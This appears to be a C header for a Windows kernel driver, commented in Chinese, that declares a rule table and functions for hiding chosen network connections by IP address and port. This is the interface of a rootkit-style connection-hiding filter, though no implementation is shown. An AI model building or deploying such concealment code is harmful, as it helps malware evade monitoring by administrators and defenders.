#pragma once
#include <ntddk.h>

// 最大隐藏规则数量
#define MAX_HIDE_RULES 32

// 隐藏规则结构
typedef struct _HIDE_RULE {
    ULONG   LocalAddr;      // 本地 IP (0=任意, 网络字节序)
    USHORT  LocalPort;      // 本地端口 (0=任意, 网络字节序)
    ULONG   RemoteAddr;     // 远程 IP (0=任意, 网络字节序)
    USHORT  RemotePort;     // 远程端口 (0=任意, 网络字节序)
    BOOLEAN Enabled;        // 规则是否启用
} HIDE_RULE, *PHIDE_RULE;

// 全局隐藏规则数组
extern HIDE_RULE g_HideRules[MAX_HIDE_RULES];
extern ULONG g_HideRuleCount;
extern KSPIN_LOCK g_HideRuleLock;

// 初始化过滤引擎
NTSTATUS FilterInitialize();

// 清理过滤引擎
VOID FilterCleanup();

// 添加隐藏规则
// 参数均为网络字节序，0 表示匹配任意
NTSTATUS AddHideRule(
    ULONG LocalAddr,
    USHORT LocalPort,
    ULONG RemoteAddr,
    USHORT RemotePort
);

// 移除隐藏规则
NTSTATUS RemoveHideRule(ULONG Index);

// 清空所有规则
VOID ClearAllHideRules();

// 检查连接是否应该被隐藏
// 参数均为网络字节序
BOOLEAN ShouldHideConnection(
    ULONG LocalAddr,
    USHORT LocalPort,
    ULONG RemoteAddr,
    USHORT RemotePort
);

// 辅助宏：将主机字节序转换为网络字节序
#define HTONS(x) ((USHORT)(((x) << 8) | (((x) >> 8) & 0xFF)))
#define HTONL(x) ((((x) & 0xFF) << 24) | (((x) & 0xFF00) << 8) | \
                  (((x) >> 8) & 0xFF00) | (((x) >> 24) & 0xFF))

// IP 地址构造宏 (a.b.c.d -> 网络字节序)
#define MAKE_IP(a, b, c, d) ((ULONG)(((a) & 0xFF) | (((b) & 0xFF) << 8) | \
                            (((c) & 0xFF) << 16) | (((d) & 0xFF) << 24)))
